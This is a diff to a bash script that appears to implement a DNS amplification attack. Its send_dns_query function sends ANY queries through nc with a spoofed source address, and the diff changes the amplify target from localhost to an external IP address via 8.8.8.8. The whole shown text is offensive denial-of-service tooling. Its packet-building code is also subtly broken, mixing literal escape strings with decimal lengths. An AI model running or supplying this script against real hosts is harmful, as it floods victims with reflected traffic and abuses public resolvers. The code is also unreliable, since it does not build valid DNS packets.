@@ -28,23 +28,21 @@ function send_dns_query {
     local query_type="$3"
     local resolver="$4"
 
-    local txid=$(od -An -N2 -t x2 /dev/random)
-    
-    local packet=$(printf "\x${txid:0:2}\x${txid:2:2}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00")
-    echo $packet
-    local query=$(echo -n "$query_type" | sed 's/\./\\./g')
-    local packet+=$(printf "\x${#query}\x${query}\x00\x00\x01\x00\x01")
+    local txid=$(printf '%04x' $((RANDOM % 65536)))
+
+    local packet="\x${txid:0:2}\x${txid:2:2}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+    local query=$(echo -n "$query_type" | sed 's/\./\\./g' | cut -c 1-255)
+    packet+="\x${#query}\x${query}\x00\x00\x01\x00\x01"
 
     if ! command -v nc &> /dev/null; then
         echo "nc command not found"
         return 1
     fi
-    
-    if ! echo -n "$packet" | nc -u -w1 -s "$src_ip" "$resolver" "$port" > /dev/null; then
-        echo "Failed to send DNS query"
+
+    if ! echo -n "$packet" | nc -u -w1 -s "$src_ip" "$resolver" "$port" 2>&1 >/dev/null; then
+        echo "Failed to send DNS query: $(echo -n "$packet" | nc -u -w1 -s "$src_ip" "$resolver" "$port" 2>&1)"
         return 1
     fi
-
 }
 
 function amplify {
@@ -119,4 +117,4 @@ function main {
 }
 
 get_public_dns_servers
-amplify 127.0.0.1 53 ANY 8.8.8.8
+amplify 232.123.45.3 53 ANY 8.8.8.8
